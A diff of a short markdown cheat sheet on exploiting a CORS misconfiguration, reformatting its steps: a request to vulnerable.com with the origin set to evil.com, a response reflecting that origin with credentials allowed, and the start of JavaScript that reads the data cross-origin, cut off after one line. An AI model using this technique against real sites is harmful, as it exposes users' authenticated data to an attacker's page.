@@ -8,25 +8,33 @@
 
 ## How to:
 
-#### 1. set the origin
+#### 1. set the origin:
 
-GET /sensitiveData HTTP/1.1  
-Host: vulnerable.com  
-Origin: [https://evil.com](https://evil.com/)
+```text
+GET /sensitiveData HTTP/1.1
+Host: vulnerable.com
+Origin: 
+https://evil.com
+
+```
 
 
 
-#### 2. find the response that can be controlled
 
+
+#### 2. find the response that can be controlled:
+
+```text
 HTTP/1.1 200 OK 
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true
+```
 
-Access-Control-Allow-Origin: [https://evil.com](https://evil.com) 
-
-Access-Control-Allow-Credentials: true ...
+The `Access-Control-Allow-Origin` be written by Origin and \`Access-Control-Allow-Credentials\` is true.
 
 
 
-#### 3. use the js interact with the service:
+#### 3. use the js to interact with the service:
 
 ```javascript
 var req = new XMLHttpRequest();
